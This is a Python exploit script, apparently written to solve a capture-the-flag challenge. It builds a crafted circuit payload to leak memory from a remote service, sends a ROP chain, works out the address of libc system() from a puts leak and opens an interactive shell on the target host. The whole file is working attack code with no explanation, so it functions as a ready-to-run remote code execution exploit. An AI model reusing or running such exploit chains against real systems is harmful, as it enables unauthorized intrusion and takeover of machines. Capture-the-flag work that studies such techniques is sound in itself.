import struct
import itertools
import traceback

r = []

def _and(dst, a, b):
	r.append((1, a, b, 0, dst))

def _or(dst, a, b):
	r.append((2, a, b, 0, dst))

def _xor(dst, a, b):
	r.append((3, a, b, 0, dst))

def add(a, b, count=64, is_sub=False):
	if is_sub:
		_xor(0x20, 0, 1)
	else:
		_xor(0x20, 0, 0)
	for i in range(count):
		_xor(4, a, 0)
		if is_sub:
			_xor(5, b, 1)
		else:
			_xor(5, b, 0)
		_xor(3, 4, 5)
		_xor(a, 3, 0x20)
		_and(2, 4, 5)
		_and(0x20, 0x20, 3)
		_or(0x20, 0x20, 2)
		a += 1
		b += 1

def mov(a, b, count=64):
	for i in range(count):
		_or(a + i, b + i, 0)

def generator():
	global ram_size
	return itertools.permutations(range(0x10, ram_size), 3)

def filter(payload):
	r = ''
	for i, j in zip(range(0, len(payload), 40), generator()):
		r += payload[i:i+8] + struct.pack("<4Q", j[0], j[1], 0, j[2])
	return r

delta = 0xbacb0 + 0x630 - 0x30 + 8 + 0xffd60 + 0xa50 - 0x858 + 0x250 - 0x3c - 0x3f0
leakdelta = 16 + 32 * 4800 * 5
ram_size = 0x1000 * 8
cdelta = ram_size / 8 + 0x10
cp_size = 0x2c00

consts = [
delta,
1
]

mov(0x10 * 8 + 12, leakdelta * 8 + 12, 64 - 12)
mov(0x20 * 8, (leakdelta + 8) * 8, 64)
mov(0x1000 + 20, 0x20 * 8 + 20, 64 - 20)
add(0x1000, 0x20 * 8, 21)
add(0x1000 + 12, 0x10 * 8 + 12, 21, True)
npos = cdelta + 40 * (len(r) + 64 - 3 + 1)
print hex(npos)
mov(npos * 8 + 32 * 8 + 3, 0x1000, 64 - 3) # 3bit shift
r += [[4, 0x10, 0x10, 0x10, 0x10]]
_or(0, 0x1040, 0x1040)
print hex(len(r) * 40)
print hex(cp_size)
cp_size = max(cp_size, len(r) * 40)
r += [[1, 0, 0, 0, 0]] * (cp_size / 40 - len(r))
payload = ''.join(''.join(struct.pack("<Q", x & 0xffffffffffffffff) for x in y) for y in r)
print hex(len(r) * 40)
print hex(ram_size * 48)
r = struct.pack("<QQ", ram_size, len(r)) + filter(payload)

open('cp', 'wb').write(r)

def encode(payload):
	payload = struct.unpack("<%dQ" % (len(payload) / 8), payload)
	payload = ''.join([bin(x)[2:].zfill(64)[::-1] for x in payload])
	return payload

def decode(payload):
	payload += '0' * (64 - len(payload) % 64)
	payload = ''.join([chr(int(''.join(payload[i:i+8][::-1]), 2)) for i in range(0, len(payload), 8)])
	payload = [struct.unpack("<Q", payload[i:i+8])[0] for i in range(0, len(payload), 8)]
	return payload

payload2 = encode(filter(payload))
payload = encode(payload)
data = [(xy[0] != xy[1], xy[0], i) for i, xy in enumerate(zip(payload, payload2))]
data = __builtins__.filter(lambda x: x[0] == True, data)
offsets = map(lambda x: cdelta * 8 + x[2], data)
data = map(lambda x: x[1], data)

ip = range(0x1000, 0x1000 + 64 * len(consts)) + offsets
ip = struct.pack("<Q%dQ" % len(ip), len(ip), *map(lambda x: x & 0xffffffffffffffff, ip))

open('ip', 'wb').write(ip)

leakdelta += 8
op = range(leakdelta * 8, (leakdelta + 8) * 8)
op = struct.pack("<Q%dQ" % len(op), len(op), *op)
open('op', 'wb').write(op)

consts = map(lambda x: x & 0xffffffffffffffff, consts)
consts += decode(data)

input = struct.pack("<%dQ" % len(consts), *consts)
open('input', 'wb').write(input)

HOST, PORT = '192.168.199.141', 31337
HOST, PORT = '202.120.7.199', 24680

if True:
	from pwn import *
	data = open('cp', 'rb').read() + open('ip', 'rb').read()
	op = open('op', 'rb').read()
	input = open('input', 'rb').read()[:-4]
	while True:
		r = remote(HOST, PORT)
		r.send(data)
		raw_input('>> ')
		r.send(input)
		r.send(op)
		try:
			leak = r.recvn(8)
			leak = u64(leak)
			print hex(leak)
			rop = 'a' * 0xf8 + p64(0x403c33) + p64(0x605028) + p64(0x400c20) + p64(0x403c33) + p64(0x605028) + p64(0x400cc0) + p64(0x403c33) + p64(0x605030) + p64(0x400c20)
			print `r.recvline()`
			raw_input('>> ')
			r.sendline(rop)
			leak = r.recvline()[:-1]
			print `leak`
			leak = u64(leak.ljust(8, '\x00'))
			libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
			libc = ELF('/=/Downloads/0ctflibc.so.6')
			leak -= libc.symbols['puts'] - libc.symbols['system']
			r.sendline(p64(leak) + 'sh')
			r.interactive()
			break
		except:
			traceback.print_exc()
			r.close()
			continue

